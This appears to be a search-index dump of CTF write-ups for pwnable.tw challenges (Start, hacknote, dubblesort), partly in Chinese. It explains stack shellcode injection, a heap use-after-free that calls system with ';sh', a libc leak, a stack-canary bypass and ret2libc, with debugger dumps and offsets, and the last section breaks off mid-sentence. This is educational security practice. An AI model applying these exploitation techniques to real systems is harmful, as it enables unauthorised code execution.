            "text": "Start\n\n\n\n\nChallenge link: \nStart\n\n\nCategoty: pwn\n\n\nWriteup: \nStart\n\n\n\n\nJust a start.\n\n\nnc chall.pwnable.tw 10000\n\n\nstart\n\n\nnc\n\n\nLet\ns start the CTF:{input}\n\n\n\n\nObservation\n\n\nRead length\n\n\ncan read \n0x3c\n bytes\n\n\n\n\nBuf\n\n\nstore on stack and \nstack excutable\n\n\n\n\nRet\n\n\nPayload = 20 bytes\n\n\nSolution\n\n\nLeak stack address\n\n\nIf we want to execute code on stack, we should return $PC to stack at first. However, stack address is not always the same. Thus, we should leak stack address in the beginning.\n\n\nTarget\n\n\nThere is an address (\n0xffffd220\n) after return address.\n\n\n$esp\n will be \n0xffffd21c\n ( \n \n0xffffd220\n) after return, then we can use \nwrite\n to print this address.\n\n\n\n\nReturn\n\n\nReturn to \nmov ecx, esp\n before \nwrite\n to mov buffer to the target.\n\n\n\n\nShellcode\n\n\nAfter leaking address, we get another chance to write. Buffer is $esp (still on the stack).\n\n\nTarget\n\n\nI found that return address on the stack is \n0x%%%%%%T0\n\n- % from the address leaked in advance\n- T is a random number from 0 to f\n\n\nTherefore, just put \n0x%%%%%%T4\n at return address. Then write shellcode after it.\n\n\n\n\nWhich number is T ?\n\n\nThere are 16 possible numbers, so just \nguess\n !!!\n\n\nYou will get shell if you are fortunate enough. OwO", 
            "title": "Start"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#start", 
            "text": "Challenge link:  Start  Categoty: pwn  Writeup:  Start   Just a start.  nc chall.pwnable.tw 10000  start", 
            "title": "Start"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#nc", 
            "text": "Let s start the CTF:{input}", 
            "title": "nc"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#observation", 
            "text": "", 
            "title": "Observation"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#read-length", 
            "text": "can read  0x3c  bytes", 
            "title": "Read length"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#buf", 
            "text": "store on stack and  stack excutable", 
            "title": "Buf"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#ret", 
            "text": "Payload = 20 bytes", 
            "title": "Ret"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#leak-stack-address", 
            "text": "If we want to execute code on stack, we should return $PC to stack at first. However, stack address is not always the same. Thus, we should leak stack address in the beginning.", 
            "title": "Leak stack address"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#target", 
            "text": "There is an address ( 0xffffd220 ) after return address.  $esp  will be  0xffffd21c  (    0xffffd220 ) after return, then we can use  write  to print this address.", 
            "title": "Target"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#return", 
            "text": "Return to  mov ecx, esp  before  write  to mov buffer to the target.", 
            "title": "Return"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#shellcode", 
            "text": "After leaking address, we get another chance to write. Buffer is $esp (still on the stack).", 
            "title": "Shellcode"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#target_1", 
            "text": "I found that return address on the stack is  0x%%%%%%T0 \n- % from the address leaked in advance\n- T is a random number from 0 to f  Therefore, just put  0x%%%%%%T4  at return address. Then write shellcode after it.", 
            "title": "Target"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/#which-number-is-t", 
            "text": "There are 16 possible numbers, so just  guess  !!!  You will get shell if you are fortunate enough. OwO", 
            "title": "Which number is T ?"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/hacknote/", 
            "text": "hacknote\n\n\n\n\nChallenge Link: \nhacknote\n\n\nCategory: pwn\n\n\nWriteup: \nhacknote\n\n\n\n\nA good Hacker should always take good notes!\n\n\nnc chall.pwnable.tw 10102\n\n\nhacknote\n\n\nlibc.so\n\n\nObservation\n\n\nThis challenge is a Hacknote. There are 4 features (actually 3) - \nAdd, Delete, and Print\n.\n\n\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :1\nNote size :20\nContent :abcd \nSuccess !\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :3\nIndex :0\nabcd\n\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :2\nIndex :0\nSuccess\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :4\n\n\n\n\nI wrote another challenge in \ncsie.ctf.tw\n also called \"hacknote\" before, and both of these look similar.\n\n\nIn hacknote (csie), this program \nmalloc\n when add and \nfree\n when delete. However, \nit didn't set the pointer to \nNULL\n \n. Therefore, we can use add to write something, and use print to run.\n\n\nWhat do I mean ? Let's try !\n\n\nExperiment\n\n\nAdd two notes\n\n\nI add two notes with size 32 and contents are \"aaaa\" and \"bbbb\".\n\n\nHere is the value on the heap.\n\n\n0x804b000:  0x00000000  0x00000011    0x0804862b    0x0804b018\n0x804b010:  0x00000000  0x00000029    0x61616161    0x0000000a  \n======= note \naaaa\n\n0x804b020:  0x00000000  0x00000000    0x00000000    0x00000000\n                        -----------------------------\n0x804b030:  0x00000000  0x00000000  | 0x00000000    0x00000011\n            -------------------------------------\n0x804b040:  0x0804862b  0x0804b050    0x00000000    0x00000029\n0x804b050:  0x62626262  0x0000000a    0x00000000    0x00000000  \n======= note \nbbbb\n\n0x804b060:  0x00000000  0x00000000    0x00000000    0x00000000\n\n\n\n\nLet's focus on note \"aaaa\".\n\n\n           ------------------------------------------------------\n0x804b000: | 0x00000000 0x00000011  0x0804862b  0x0804b018  | \n======= struct note\n       ---------------------------------------------|--------\n                            |\n                        -------------\n                        |\n           ---------------------------------v--------------------\n0x804b010: | 0x00000000 0x00000029  0x61616161  0x0000000a  |\n0x804b020: | 0x00000000 0x00000000  0x00000000  0x00000000  | \n======= content\n0x804b030: | 0x00000000 0x00000000              |\n       ------------------------------------------------------\n\n\n\n\nThe first 8 bytes of each blocks are headers of  heap.\n\n\n\n\n\n\nstruct note is 0x10\n\n\n\n\n\n\n0x0804862b\nis print function\n\n\n\n\n\n\n 804862b:       55                      push   ebp\n 804862c:       89 e5                   mov    ebp,esp\n 804862e:       83 ec 08                sub    esp,0x8\n 8048631:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]\n 8048634:       8b 40 04                mov    eax,DWORD PTR [eax+0x4]\n 8048637:       83 ec 0c                sub    esp,0xc\n 804863a:       50                      push   eax\n 804863b:       e8 90 fe ff ff          call   80484d0 \nputs@plt\n\n 8048640:       83 c4 10                add    esp,0x10\n 8048643:       90                      nop\n 8048644:       c9                      leave  \n 8048645:       c3                      ret\n\n\n\n\nDelete\n\n\nI delete note \"aaaa\" (index 0) first, then I delete note \"bbbb\" (index 1).\n\n\nHere is the fastbin in heap.\n\n\n(0x10)     fastbin[0]: 0x804b038 --\n 0x804b000 --\n 0x0\n(0x18)     fastbin[1]: 0x0\n(0x20)     fastbin[2]: 0x0\n(0x28)     fastbin[3]: 0x804b048 --\n 0x804b010 --\n 0x0\n(0x30)     fastbin[4]: 0x0\n(0x38)     fastbin[5]: 0x0\n(0x40)     fastbin[6]: 0x0\n                  top: 0x804b070 (size : 0x20f90) \n       last_remainder: 0x0 (size : 0x0) \n            unsortbin: 0x0\n\n\n\n\nReallocate\n\n\nI add a new note with size \n0x8\n (0x8 + header = 0x10). Note 2 is allocated to 0x804b038, and it's content is 0x804b000 (original note 0).\n\n\n          ---------------------------------------------------------------\n0x804b000:    | 0x00000000      0x00000011      0x61616161      0x0804b00a  | \n== content\n          ---------------------------------------------------------------\n0x804b010:      0x00000000      0x00000029      0x00000000      0x0000000a\n0x804b020:      0x00000000      0x00000000      0x00000000      0x00000000\n                         --------------------------------\n0x804b030:      0x00000000      0x00000000   |  0x00000000      0x00000011  |\n          --------------------------------                  | \n== struct\n0x804b040:    | 0x0804862b      0x0804b008                  |\n          ---------------------------------------------------------------\n\n\n\n\nSolution\n\n\nAccroding to the experiment above, we can exploit it by reusing note.\n\n\nLeak libc\n\n\nFirst, we should leak the base of libc in order to using system().\n\n\nI choose \nputs_got = 0x804a024\nto leak.\n\n\nBecause of the size of struct is 0x10, we can only use only 0x8 as content size (0x8 + header = 0x10). Thus, I put \nprintNote function\n and \nputs_got\nin content to leak base.\n\n\nAfter adding note 2, note 0 is like this:\n\n\nstruct\n \nnote\n \n{\n\n    \nprintNote\n();\n        \n// 0x0804862b\n\n    \nputs_got\n;\n       \n// 0x804a024\n\n\n}\n\n\n\n\n\nWhen we print note 0, it will call printNote() then print puts_got.\n\n\nSystem()\n\n\nBefore printing note, this program send address of note as parameter to function.\n\n\n\n\n                        -----------------\n0x804b000:      0x00000000      0x00000011  |   0x0804862b  |    0x0804b018\n                        -----------------\n0x804b010:      0x00000000      0x00000029      0x61616161      0x0000000a\n\n\n\n\nWhat if this function is system() ?? Value from \n0x804b008\nwould be considered as string.\n\n\nTherefore, we can put something like \n;sh\n in content. Because string before \n;\n can not be executed, we have to add a \n;\n to split it. \n\n\nAfter printing (system), a shell will prompt !!", 
            "title": "hacknote"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/hacknote/#hacknote", 
            "text": "Challenge Link:  hacknote  Category: pwn  Writeup:  hacknote   A good Hacker should always take good notes!  nc chall.pwnable.tw 10102  hacknote  libc.so", 
            "title": "hacknote"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/hacknote/#observation", 
            "text": "This challenge is a Hacknote. There are 4 features (actually 3) -  Add, Delete, and Print .  ----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :1\nNote size :20\nContent :abcd \nSuccess !\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :3\nIndex :0\nabcd\n\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :2\nIndex :0\nSuccess\n----------------------\n       HackNote       \n----------------------\n 1. Add note          \n 2. Delete note       \n 3. Print note        \n 4. Exit              \n----------------------\nYour choice :4  I wrote another challenge in  csie.ctf.tw  also called \"hacknote\" before, and both of these look similar.  In hacknote (csie), this program  malloc  when add and  free  when delete. However,  it didn't set the pointer to  NULL   . Therefore, we can use add to write something, and use print to run.  What do I mean ? Let's try !", 
            "title": "Observation"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/hacknote/#experiment", 
            "text": "", 
            "title": "Experiment"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/hacknote/#add-two-notes", 
            "text": "I add two notes with size 32 and contents are \"aaaa\" and \"bbbb\".  Here is the value on the heap.  0x804b000:  0x00000000  0x00000011    0x0804862b    0x0804b018\n0x804b010:  0x00000000  0x00000029    0x61616161    0x0000000a   ======= note  aaaa \n0x804b020:  0x00000000  0x00000000    0x00000000    0x00000000\n                        -----------------------------\n0x804b030:  0x00000000  0x00000000  | 0x00000000    0x00000011\n            -------------------------------------\n0x804b040:  0x0804862b  0x0804b050    0x00000000    0x00000029\n0x804b050:  0x62626262  0x0000000a    0x00000000    0x00000000   ======= note  bbbb \n0x804b060:  0x00000000  0x00000000    0x00000000    0x00000000  Let's focus on note \"aaaa\".             ------------------------------------------------------\n0x804b000: | 0x00000000 0x00000011  0x0804862b  0x0804b018  |  ======= struct note\n       ---------------------------------------------|--------\n                            |\n                        -------------\n                        |\n           ---------------------------------v--------------------\n0x804b010: | 0x00000000 0x00000029  0x61616161  0x0000000a  |\n0x804b020: | 0x00000000 0x00000000  0x00000000  0x00000000  |  ======= content\n0x804b030: | 0x00000000 0x00000000              |\n       ------------------------------------------------------  The first 8 bytes of each blocks are headers of  heap.    struct note is 0x10    0x0804862b is print function     804862b:       55                      push   ebp\n 804862c:       89 e5                   mov    ebp,esp\n 804862e:       83 ec 08                sub    esp,0x8\n 8048631:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]\n 8048634:       8b 40 04                mov    eax,DWORD PTR [eax+0x4]\n 8048637:       83 ec 0c                sub    esp,0xc\n 804863a:       50                      push   eax\n 804863b:       e8 90 fe ff ff          call   80484d0  puts@plt \n 8048640:       83 c4 10                add    esp,0x10\n 8048643:       90                      nop\n 8048644:       c9                      leave  \n 8048645:       c3                      ret", 
            "title": "Add two notes"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/hacknote/#delete", 
            "text": "I delete note \"aaaa\" (index 0) first, then I delete note \"bbbb\" (index 1).  Here is the fastbin in heap.  (0x10)     fastbin[0]: 0x804b038 --  0x804b000 --  0x0\n(0x18)     fastbin[1]: 0x0\n(0x20)     fastbin[2]: 0x0\n(0x28)     fastbin[3]: 0x804b048 --  0x804b010 --  0x0\n(0x30)     fastbin[4]: 0x0\n(0x38)     fastbin[5]: 0x0\n(0x40)     fastbin[6]: 0x0\n                  top: 0x804b070 (size : 0x20f90) \n       last_remainder: 0x0 (size : 0x0) \n            unsortbin: 0x0", 
            "title": "Delete"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/hacknote/#reallocate", 
            "text": "I add a new note with size  0x8  (0x8 + header = 0x10). Note 2 is allocated to 0x804b038, and it's content is 0x804b000 (original note 0).            ---------------------------------------------------------------\n0x804b000:    | 0x00000000      0x00000011      0x61616161      0x0804b00a  |  == content\n          ---------------------------------------------------------------\n0x804b010:      0x00000000      0x00000029      0x00000000      0x0000000a\n0x804b020:      0x00000000      0x00000000      0x00000000      0x00000000\n                         --------------------------------\n0x804b030:      0x00000000      0x00000000   |  0x00000000      0x00000011  |\n          --------------------------------                  |  == struct\n0x804b040:    | 0x0804862b      0x0804b008                  |\n          ---------------------------------------------------------------", 
            "title": "Reallocate"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/hacknote/#solution", 
            "text": "Accroding to the experiment above, we can exploit it by reusing note.", 
            "title": "Solution"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/hacknote/#leak-libc", 
            "text": "First, we should leak the base of libc in order to using system().  I choose  puts_got = 0x804a024 to leak.  Because of the size of struct is 0x10, we can only use only 0x8 as content size (0x8 + header = 0x10). Thus, I put  printNote function  and  puts_got in content to leak base.  After adding note 2, note 0 is like this:  struct   note   { \n     printNote ();          // 0x0804862b \n     puts_got ;         // 0x804a024  }   When we print note 0, it will call printNote() then print puts_got.", 
            "title": "Leak libc"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/hacknote/#system", 
            "text": "Before printing note, this program send address of note as parameter to function.                           -----------------\n0x804b000:      0x00000000      0x00000011  |   0x0804862b  |    0x0804b018\n                        -----------------\n0x804b010:      0x00000000      0x00000029      0x61616161      0x0000000a  What if this function is system() ?? Value from  0x804b008 would be considered as string.  Therefore, we can put something like  ;sh  in content. Because string before  ;  can not be executed, we have to add a  ;  to split it.   After printing (system), a shell will prompt !!", 
            "title": "System()"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/", 
            "text": "dubblesort\n\n\n\n\nChallenge link: \ndubblesort\n\n\nCategory: pwn\n\n\nWriteup: \ndubblesort\n\n\n\n\nSort the memory!\n\n\nnc chall.pwnable.tw 10101\n\n\ndubblesort\n\n\nlibc.so\n\n\nObservation\n\n\n\u4e00\u958b\u59cb\u7a0b\u5f0f\u5148\u554f\u4e86\n\u540d\u5b57\n\uff0c\u63a5\u8457\u554f\u8981\n\u6392\u5217\u5e7e\u500b\u6578\u5b57\n \uff0c\u6700\u5f8c\u4f9d\u5e8f\u8f38\u5165\n\u5404\u500b\u6578\u5b57\n\u5f8c\u6703\u6392\u5217\u5b8c\u8f38\u51fa\u7d50\u679c\n\n\n\u770b\u5230\u9019\u984c\u6642\uff0c\u6211\u60f3\u5230\u4e4b\u524d\u5728 \ncsie.ctf.tw\n \u6709\u5beb\u904e\u4e00\u984c bubblesort \uff0c\u90a3\u984c\u662f\u900f\u904e\u6392\u5217\u7684\u6578\u5b57\u6c92\u6709\u9650\u5236\u6578\u91cf\u4f86\u84cb\u5230 return address\uff0c\u6216\u8a31\u9019\u984c\u6709\u985e\u4f3c\u7684\u6f0f\u6d1e\n\n\n$ ./dubblesort\nWhat your name :a\nHello a\n,How many numbers \ndo\n you what to sort :3\nEnter the \n0\n number : \n0\n\nEnter the \n1\n number : \n1\n\nEnter the \n2\n number : \n2\n\nProcessing......\nResult :\n\n0\n \n1\n \n2\n\n\n\n\n\nfile\n\n\n$ file dubblesort\ndubblesort: ELF \n32\n-bit LSB shared object, Intel \n80386\n, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib/ld-linux.so.2, \nfor\n GNU/Linux \n2\n.6.24, BuildID\n[\nsha1\n]=\n12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped\n\n\n\n\nchecksec\n\n\n\u4fdd\u8b77\u5168\u958b\n\n\ngdb-peda$ checksec\nCANARY    : ENABLED\nFORTIFY   : ENABLED\nNX        : ENABLED\nPIE       : ENABLED\nRELRO     : FULL\n\n\n\n\ninput\n\n\n\u540d\u5b57\u662f\u4f7f\u7528 \nread()\n \u4f86\u8b80\u53d6\uff0c\u8b80\u53d6\u7684\u9577\u5ea6\u662f 0x40\n\n\n   0x56555a11 \nmain+78\n:    mov    DWORD PTR \n[\nesp\n]\n,0x0\n\n=\n 0x56555a18 \nmain+85\n:    call   0x56555630 \nread@plt\n\n   0x56555a1d \nmain+90\n:    mov    DWORD PTR \n[\nesp+0x8\n]\n,esi\nGuessed arguments:\narg\n[\n0\n]\n: 0x0\narg\n[\n1\n]\n: 0xffffd72c --\n 0xff17\narg\n[\n2\n]\n: 0x40 \n(\n@\n)\n\n\n\n\n\n\u8981\u6392\u5217\u7684\u6578\u91cf\u662f\u4f7f\u7528 \nscanf()\n \uff0c\u4e14\u53c3\u6578\u662f \n%u\n \u4e5f\u5c31\u662f unsigned int\n\n\n   0x56555a45 \nmain+130\n:   mov    DWORD PTR \n[\nesp\n]\n,eax\n\n=\n 0x56555a48 \nmain+133\n:   call   0x56555700 \n__isoc99_scanf@plt\n\n   0x56555a4d \nmain+138\n:   mov    eax,DWORD PTR \n[\nesp+0x18\n]\n\nGuessed arguments:\narg\n[\n0\n]\n: 0x56555bfa --\n 0x45007525 \n(\n%u\n)\n\narg\n[\n1\n]\n: 0xffffd708 --\n 0xe0\n\n\n\n\n\u63a5\u8457\u6578\u5b57\u7684\u90e8\u5206\u4e00\u6a23\u662f\u4f7f\u7528 \nscanf()\n \u52a0\u4e0a \n%u\n \n\n\n   0x56555a92 \nmain+207\n:   mov    DWORD PTR \n[\nesp\n]\n,eax\n\n=\n 0x56555a95 \nmain+210\n:   call   0x56555700 \n__isoc99_scanf@plt\n\n   0x56555a9a \nmain+215\n:   add    esi,0x1\nGuessed arguments:\narg\n[\n0\n]\n: 0x56555bfa --\n 0x45007525 \n(\n%u\n)\n\narg\n[\n1\n]\n: 0xffffd70c --\n 0xf7f37f0a \n(\nmov    edx,DWORD PTR \n[\nesp+0x18\n])\n\n\n\n\n\nsort\n\n\nsort \u7684\u53c3\u6578\u662f \u8981\u6392\u5217\u7684\u6578\u91cf \u4ee5\u53ca \u7b2c\u4e00\u500b\u6578\u5b57\u5728 stack \u4e0a\u7684\u4f4d\u5740\uff0c\u6392\u5217\u7684\u65b9\u5f0f\u770b\u8d77\u4f86\u6c92\u4ec0\u9ebc\u554f\u984c\n\n\n   0x56555ab0 \nmain+237\n:   mov    DWORD PTR \n[\nesp\n]\n,eax\n\n=\n 0x56555ab3 \nmain+240\n:   call   0x56555931\n   0x56555ab8 \nmain+245\n:   lea    eax,\n[\nebx-0x138c\n]\n\nGuessed arguments:\narg\n[\n0\n]\n: 0xffffd70c --\n 0x0\narg\n[\n1\n]\n: 0x3\n----------------------- stack -----------------------\n\n0028\n|\n 0xffffd70c --\n 0x0        \n# num 0\n\n\n0032\n|\n 0xffffd710 --\n 0x1        \n# num 1\n\n\n0036\n|\n 0xffffd714 --\n 0x2        \n# num 2\n\n\n\n\n\nname\n\n\n\u5728\u6e2c\u8a66 name \u7684\u6642\u5019\uff0c\u767c\u73fe\u6709\u6642\u5019\u6703\u8f38\u51fa\u4e00\u4e9b\u4e0d\u53ef\u8996\u5b57\u5143\n\n\n./dubblesort\nWhat your name :aaaa\nHello aaaa\ny\ufffd\ufffd/,How many numbers \ndo\n you what to sort :\n\n\n\n\n\u7d93\u904e\u89c0\u5bdf\u5f8c\u767c\u73fe\u61c9\u8a72\u662f\u56e0\u70ba name \u6c92\u6709\u5c07\u6240\u6709\u7a7a\u9593\u5148\u6b78\u96f6\uff0c\u6240\u4ee5\u8f38\u51fa\u6642\u624d\u6703\u9023\u540c\u5f8c\u9762\u7684\u820a\u8cc7\u6599\u4e00\u8d77\u8f38\u51fa\n\n\nstack canary\n\n\n\u56e0\u70ba\u6709\u958b canary \u7684\u95dc\u4fc2\uff0c\u5c31\u7b97\u6c92\u6709\u6aa2\u67e5\u6700\u591a\u53ef\u4ee5\u8f38\u5165\u5e7e\u500b\u6578\u5b57\uff0c\u518d\u8f38\u5165\u8d85\u904e\u6642\u4f9d\u7136\u6703\u5674\u932f\n\n\n*** stack smashing detected ***: ./dubblesort terminated\n\n\n\n\n\u5229\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u6e2c\u8a66\uff0c\u767c\u73fe\u6700\u591a\u53ea\u80fd\u8f38\u5165\u5230 24 \u500b\u6578\u5b57\uff0c\u5982\u679c\u5230\u7b2c 25 \u500b\u6578\u5b57\u7684\u8a71\uff0c\u5728\u6392\u5217\u6642\u5c31\u6703\u5674\u51fa\u4ee5\u4e0a\u7684\u932f\u8aa4\u8a0a\u606f\n\n\nSolution\n\n\n\u7e3d\u5171\u6709\u4e09\u500b\u6b65\u9a5f\u8981\u505a\n\n\n\n\nleak libc\n\n\nbypass canary\n\n\nret2libc\n\n\n\n\nLeak libc\n\n\n\u9019\u908a\u6211\u5229\u7528\u7684\u662f name\n\n\n\u56e0\u70ba name \u7684 buffer \u6c92\u6709\u5148\u6e05\u7a7a\u7684\u95dc\u4fc2\uff0c\u6240\u4ee5\u53ef\u4ee5 leak \u51fa\u5f8c\u9762\u7684\u6578\u503c\n\n\n0060\n|\n 0xffffd72c \n(\naaaa\\n\\331\\377\\377/\n)\n\n\n0064\n|\n 0xffffd730 --\n 0xffffd90a --\n 0xfb6d2200\n\n0068\n|\n 0xffffd734 --\n 0x2f \n(\n/\n)\n\n\n0072\n|\n 0xffffd738 --\n 0x8e\n\n0076\n|\n 0xffffd73c --\n 0x16\n\n0080\n|\n 0xffffd740 --\n 0x8000\n\n0084\n|\n 0xffffd744 --\n 0xf7fcb000 --\n 0x1b1db0\n\n0088\n|\n 0xffffd748 --\n 0xf7fc9244 --\n 0xf7e31020 \n(\ncall   0xf7f38b59\n)\n    \n==\n\n\n\n\n\n\u7531\u4e0a\u9762 stack \u5167\u5bb9\u53ef\u77e5\uff0c\u7b2c 8 \u500b\u5305\u542b\u4e00\u500b\u4f4d\u5740\uff0c\u53ef\u4ee5\u8a18\u9304\u4e0b\u6b64\u6642 libc base \u8207\u5176\u4e4b\u9593\u7684\u5dee\u503c\uff0c\u4e26\u5728\u771f\u6b63 leak \u51fa\u6b64\u503c\u6642\u6e1b\u6389\u5dee\u503c\uff0c\u5373\u53ef\u5f97\u5230 libc base\n\n\n0xf7fc9244 - \nlibc_base\n \n=\n x \n(\n\u56fa\u5b9a\u7684\n)\n\nleak_addr - \nx\n \n=\n libc_base\n\n\n\n\n\u53ea\u8981\u8f38\u5165 28 (4*7) \u500b\u5b57\u5143\u4f5c\u70ba payload \uff0c\u5c31\u53ef\u4ee5\u5370\u51fa\u9019\u500b\u4f4d\u5740\u7684\u503c\u4e86\n\n\n0060\n|\n 0xffffd72c \n(\na\n \nrepeats \n28\n times\n, \n\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\n)\n\n\n0064\n|\n 0xffffd730 \n(\na\n \nrepeats \n24\n times\n, \n\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\n)\n\n\n0068\n|\n 0xffffd734 \n(\na\n \nrepeats \n20\n times\n, \n\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\n)\n\n\n0072\n|\n 0xffffd738 \n(\na\n \nrepeats \n16\n times\n, \n\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\n)\n\n\n0076\n|\n 0xffffd73c \n(\na\n \nrepeats \n12\n times\n, \n\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\n)\n\n\n0080\n|\n 0xffffd740 \n(\naaaaaaaa\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\n)\n\n\n0084\n|\n 0xffffd744 \n(\naaaa\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001\n)\n\n\n0088\n|\n 0xffffd748 --\n 0xf7fc920a --\n 0x0\n\n\n\n\nbypass canary\n\n\n\u5728 observation \u6642\uff0c\u6709\u5229\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u627e\u5230 canary \u7684\u4f4d\u7f6e\u5728\u7b2c 25 \u500b\n\n\n\u6b64\u6642\u53ef\u4ee5\u5229\u7528\u8f38\u5165\u6642\u7684 \nscanf(\n%u\n)\n \uff0c\u4e00\u822c\u5728\u8f38\u5165\u6642\uff0c\u8981\u8f38\u5165 unsigned int \u624d\u6703\u88ab\u63a5\u53d7\uff0c\u4f46\u662f\u9019\u6a23\u6703\u84cb\u6389 canary \uff0c\u7d93\u904e\u641c\u5c0b\u5f8c\u624d\u77e5\u9053\uff0c\u539f\u4f86\u53ef\u4ee5\u8f38\u5165 '+'\uff0c\u6b64\u6642\u6703\u88ab\u7576\u4f5c\u6b63\u5e38\u8f38\u5165\uff0c\u4f46\u4fdd\u7559\u6b64\u4f4d\u7f6e\u539f\u59cb\u7684\u503c\uff0c\u76f4\u63a5\u8df3\u5230\u4e0b\u4e00\u500b\uff0c\u5982\u6b64\u4e00\u4f86\u5c31\u53ef\u76f4\u63a5\u7e5e\u904e canary \u4e86\n\n\nret2libc\n\n\n\u8981\u505a\u5230 ret2libc \u7684\u8a71\u9054\u6210\u5169\u500b\u689d\u4ef6\n\n\n\n\nlibc base\n\n\nreturn address\n\n\n\n\nlibc base \u5728\u5148\u524d\u5df2\u7d93\u900f\u904e name \u53d6\u5f97\u4e86\uff0c\u60f3\u8981\u63a7\u5236 return address \u7684\u8a71\uff0c\u53ef\u4ee5\u5229\u7528\u8f38\u5165\u6578\u5b57\u6642\u7684 buffer overflow\uff0c\u56e0\u70ba\u5df2\u7d93\u8df3\u904e canary \u4e86\uff0c\u6240\u4ee5\u53ef\u4ee5\u4e00\u76f4\u63a8\u5230 return \u7684\u4f4d\u7f6e\uff0c\u4e26\u9032\u800c\u63a7\u5236 return address\n\n\n\u9019\u908a\u6211\u4e00\u6a23\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u4f86\u505a\uff0c\u5982\u679c\u6709\u84cb\u5230 return address \u7684\u4f4d\u7f6e\u7684\u8a71\u6703\u51fa\u73fe\u4ee5\u4e0b\u8a0a\u606f\n\n\n[\n*\n]\n Process \n./dubblesort\n stopped with \nexit\n code -11 \n(\nSIGSEGV\n)\n \n(\npid \n2290\n)\n\n\n\n\n\n\u641c\u5c0b\u904e\u5f8c\u77e5\u9053 return address \u662f\u5728\u7b2c 33 \u500b\u4f4d\u7f6e\n\n\n24\n(\npayload\n)\n + canary + \n7\n + ret\n\n\n\n\n\u6700\u5f8c\u5c31\u662f\u4f7f\u7528 libc base \u627e\u5230 \nsystem\n \u4ee5\u53ca \n/bin/sh\n \u4e32\u63a5\u5728 return address \u7684\u4f4d\u7f6e\u5373\u53ef\n\n\nNote\n\n\npwntool libc\n\n\n\u56e0\u70ba\u6709\u7d66 libc \uff0c\u6240\u4ee5\u5728\u672c\u6a5f\u6e2c\u8a66\u6642\u6700\u597d\u662f\u639b\u4e0a libc \uff0c\u5426\u5247\u4f4d\u5740\u53ef\u80fd\u6703\u8ddf\u9060\u7aef\u4e0d\u540c\n\n\nr\n \n=\n \nprocess\n(\n./dubblesort\n,\n \nenv\n=\n{\nLD_PRELOAD\n:\n./libc_32.so.6\n})\n\n\n\n\n\nsort\n\n\n\u5728\u8f38\u5165 payload \u6642\uff0c\u56e0\u70ba\u8f38\u5165\u5b8c\u5f8c\u9084\u6703\u9032\u884c\u6392\u5e8f\uff0c\u6240\u4ee5\u8981\u78ba\u4fdd\u6392\u5e8f\u904e\u5f8c\u9806\u5e8f\u4f9d\u7136\u4e0d\u8b8a\n\n\n\u6211\u7684\u4f5c\u6cd5\u662f\u524d 24 \u500b\u5b57\u5c31\u76f4\u63a5\u8f38\u5165 0~23 \uff0ccanary \u7684\u90e8\u5206\u8f38\u5165 + (43)\uff0c\u63a5\u8457\u5f8c\u9762\u7684 7 \u500b\u5b57\u653e libc base\uff0c\u6700\u5f8c \nsystem\n \u53ca \n/bin/sh\n \u56e0\u70ba\u8981\u52a0\u4e0a libc base \uff0c\u6240\u4ee5\u4e00\u5b9a\u6bd4 libc base \u5927\n\n\nsystem\n\n\n\u5728\u547c\u53eb system \u6642\uff0cstack \u7b2c\u4e00\u500b\u4f4d\u7f6e\u662f\u7d50\u675f\u5f8c\u7684 return address\uff0c\u56e0\u70ba\u4e0d\u6703 return 